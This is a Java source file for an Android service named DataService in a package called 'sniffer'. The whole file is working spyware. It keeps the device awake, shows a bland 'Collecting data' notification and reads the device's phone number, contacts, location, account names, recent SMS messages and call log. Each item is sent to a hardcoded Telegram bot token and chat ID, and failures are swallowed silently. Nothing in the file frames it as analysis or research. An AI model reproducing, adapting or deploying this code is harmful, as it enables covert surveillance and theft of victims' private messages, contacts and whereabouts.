package com.v8.global.sniffer;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.accessibility.AccessibilityManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class DataService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DataService:WakeLock");
        wakeLock.acquire();
        
        startForegroundService();
        sendMessage("✅ DataService started");
        collectAllData();
    }

    private void startForegroundService() {
        String channelId = "data_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Data Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("Data Service")
                .setContentText("Collecting data...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        startForeground(1, notification);
    }

    private void collectAllData() {
        new Thread(() -> {
            sendDeviceInfo();
            getContacts();
            getLocation();
            getAccounts();
            getSms();
            getCallLog();
        }).start();
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
            }
            
            sendMessage("📱 Device: " + info.toString());
        } catch (Exception e) {}
    }

    private void getContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            StringBuilder sb = new StringBuilder("📇 Contacts:\n");
            while (cursor != null && cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(": ").append(number).append("\n");
            }
            if (cursor != null) cursor.close();
            sendMessage(sb.toString());
        } catch (Exception e) {}
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                sendMessage("📍 Location: " + location.getLatitude() + "," + location.getLongitude());
            }
        } catch (Exception e) {}
    }

    private void getAccounts() {
        try {
            AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
            Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder("👤 Accounts:\n");
            for (Account acc : accounts) {
                sb.append(acc.type).append(": ").append(acc.name).append("\n");
            }
            sendMessage(sb.toString());
        } catch (Exception e) {}
    }

    private void getSms() {
        try {
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
            StringBuilder sb = new StringBuilder("📨 SMS:\n");
            while (cursor != null && cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                sb.append(address).append(": ").append(body).append("\n");
            }
            if (cursor != null) cursor.close();
            sendMessage(sb.toString());
        } catch (Exception e) {}
    }

    private void getCallLog() {
        try {
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
            StringBuilder sb = new StringBuilder("📞 Calls:\n");
            while (cursor != null && cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex("number"));
                sb.append(number).append("\n");
            }
            if (cursor != null) cursor.close();
            sendMessage(sb.toString());
        } catch (Exception e) {}
    }

    private void sendMessage(String text) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                .build();
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onResponse(Call call, Response response) { 
                try { response.close(); } catch (Exception e) {}
            }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }
}
